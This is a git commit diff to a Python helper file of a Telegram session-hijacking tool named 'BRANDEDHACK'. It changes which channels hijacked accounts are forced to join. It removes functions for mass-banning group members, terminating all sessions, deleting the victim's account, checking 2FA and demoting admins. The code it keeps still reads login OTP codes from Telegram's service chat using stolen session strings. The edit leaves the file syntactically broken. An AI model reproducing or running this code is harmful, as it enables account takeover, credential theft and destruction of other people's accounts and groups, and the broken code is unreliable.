a0a4a78a5ffd481e2dd98da1d1725621464c7a06
BtwToxic <btwalexxd@gmail.com>
2026-01-02 18:39:28 +0530

    Update steve.py

--- BRANDEDHACK/Helpers/steve.py
+++ BRANDEDHACK/Helpers/steve.py
@@ -18,48 +18,15 @@ import telethon;from telethon import functions as ok
 from pyrogram.types import ChatPrivileges
 from telethon.tl.types import ChannelParticipantsAdmins
 
-async def users_gc(session):
-    err = ""
-    msg = ""
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()                          
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))
-            except Exception as e:
-                print(e)
-            k = await steve(GetAdminedPublicChannelsRequest())            
-            for x in k.chats:                
-                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
-            await steve.disconnect()
-                 
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)    
-                k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
-                for x in k.chats:
-                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
-    except Exception as idk:
-        err += str(idk)                                             
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return msg
- 
-async def user_info(session):
+ async def user_info(session):
     err = ""
     try:
         if session.endswith("="):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))
+                await steve(join("@tgsupplyupdates"))
+                await steve(join("@techbotss"))
             except Exception as e:
                 print(e)
             k = await steve.get_me()  
@@ -69,8 +36,8 @@ async def user_info(session):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
+                    await stark.join_chat("@techbotss")
+                    await stark.join_chat("@tgsupplyupdates")
                 except Exception as e:
                     print(e)    
                 k = await stark.get_me()
@@ -83,69 +50,6 @@ async def user_info(session):
     return msg    
 
 
-RIGHTS = ChatBannedRights(
-    until_date=None,
-    view_messages=True,
-    send_messages=True,
-    send_media=True,
-    send_stickers=True,
-    send_gifs=True,
-    send_games=True,
-    send_inline=True,
-    embed_links=True,
-)
-
-async def banall(session,id):
-    err = ""
-    msg = ""
-    all = 0
-    bann = 0
-    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))
-            except Exception as e:
-                print(e)
-            admins = await steve.get_participants(gc_id, filter=ChannelParticipantsAdmins)
-            admins_id = [i.id for i in admins]                
-            async for user in steve.iter_participants(gc_id):
-                all += 1
-                try:
-                    if user.id not in admins_id:
-                       await steve(EditBannedRequest(gc_id, user.id, RIGHTS))
-                       bann += 1
-                       await asyncio.sleep(0.1)
-                except Exception:
-                    await asyncio.sleep(0.1)
-            await steve.disconnect()
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)    
-                async for members in stark.get_chat_members(gc_id):  
-                    all += 1                
-                    try:                                          
-                        await stark.ban_chat_member(gc_id,members.user.id)  
-                        bann += 1                  
-                    except FloodWait as i:
-                        await asyncio.sleep(i.value)
-                    except Exception as er:
-                        pass 
-                          
-    except Exception as idk:
-        err += str(idk) 
-    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"                                            
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return msg
-
 async def get_otp(session):
     err = ""
     i = ""
@@ -154,8 +58,8 @@ async def get_otp(session):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
             try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))
+                await steve(join("@tgsupplyupdates"))
+                await steve(join("@tgsupplyupdates"))
             except Exception as e:
                 print(e)
             async for x in steve.iter_messages(777000, limit=2):               
@@ -166,8 +70,8 @@ async def get_otp(session):
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
+                    await stark.join_chat("@tgsupplyupdates")
+                    await stark.join_chat("@tgsupplyupdates")
                 except Exception as e:
                     print(e)    
                 ok = []
@@ -178,303 +82,3 @@ async def get_otp(session):
     except Exception as idk:
         err += str(idk)
                     
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return i
-
-async def join_ch(session,id):
-    err = ""
-    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))              
-            except Exception as e:
-                print(e)
-            await steve(join(gc_id))            
-            await steve.disconnect() 
-                             
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)    
-                await stark.join_chat(gc_id)
-    except Exception as idk:
-        err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "Jᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"
-
-async def leave_ch(session,id):
-    err = ""
-    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))               
-            except Exception as e:
-                print(e)
-            await steve(leave(gc_id))            
-            await steve.disconnect() 
-                             
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)    
-                await stark.leave_chat(gc_id)
-    except Exception as idk:
-        err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!"
-
-async def del_ch(session,id):
-    '''
-    try nhi kia error aaye to btana
-    '''
-    err = ""
-    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))                
-            except Exception as e:
-                print(e)
-            await steve(dc(gc_id))            
-            await steve.disconnect() 
-                             
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)    
-                await stark.invoke(
-                    functions.channels.DeleteChannel(channel= await stark.resolve_peer(gc_id)))
-            
-    except Exception as idk:
-        err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
-
-async def check_2fa(session):
-    err = ""
-    i = ""
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))               
-            except Exception as e:
-                print(e)
-            try:
-                await steve.edit_2fa("idkbsdkjsj")
-                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
-                
-            except Exception as e:
-                print(e)
-                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
-                        
-            await steve.disconnect() 
-                             
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)    
-               # try:
-                yes = await stark.invoke(functions.account.GetPassword())
-                if yes.has_password:
-                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
-                else:
-                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"                                                           
-    except Exception as idk:
-        err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return i
-
-async def terminate_all(session):
-    err = ""
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))             
-            except Exception as e:
-                print(e)
-            await steve(rt())
-            await steve.disconnect() 
-                             
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)    
-                await stark.invoke(functions.auth.ResetAuthorizations())
-    except Exception as idk:
-        err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"
-
-      
-async def del_acc(session):
-    err = ""
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))              
-            except Exception as e:
-                print(e)
-            await steve(ok.account.DeleteAccountRequest("owner madarchod h"))
-            await steve.disconnect() 
-                             
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)    
-                await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
-    except Exception as idk:
-        err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."
-
-      
-FULL_PROMOTE_POWERS = ChatPrivileges(
-    can_change_info=True,
-    can_delete_messages=True,
-    can_restrict_members=True,
-    can_pin_messages=True,
-    can_manage_video_chats=True,
-    can_promote_members=True,    
-    can_invite_users=True)
-
-PROMOTE_POWERS = ChatPrivileges(
-    can_change_info=True,
-    can_delete_messages=True,
-    can_restrict_members=True,
-    can_pin_messages=True)
-
-async def piromote(session,gc_id,user_id):
-    err = ""
-    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
-    user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))                
-            except Exception as e:
-                print(e)
-            try:
-                await steve.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
-            except:
-                await steve.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
-            await steve.disconnect()                              
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)
-                try:    
-                    await stark.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
-                except:
-                    await stark.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
-    except Exception as idk:
-        err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."
-
-
-DEMOTE = ChatPrivileges(
-        can_change_info=False,
-        can_invite_users=False,
-        can_delete_messages=False,
-        can_restrict_members=False,
-        can_pin_messages=False,
-        can_promote_members=False,
-        can_manage_chat=False,
-        can_manage_video_chats=False,
-    )
-
-async def demote_all(session,gc_id):
-    err = ""
-    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            try:
-                await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_PAID_CC"))
-                await steve(join(CHAT))                
-            except Exception as e:
-                print(e)
-            async for x in steve.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
-                try:
-                    await steve.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
-                except:
-                    await steve.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
-          
-            await steve.disconnect()                              
-        else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-                try:
-                    await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_PAID_CC")
-                except Exception as e:
-                    print(e)
-                async for m in stark.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
-                    await stark.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
-    except Exception as idk:
-        err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."      
-          
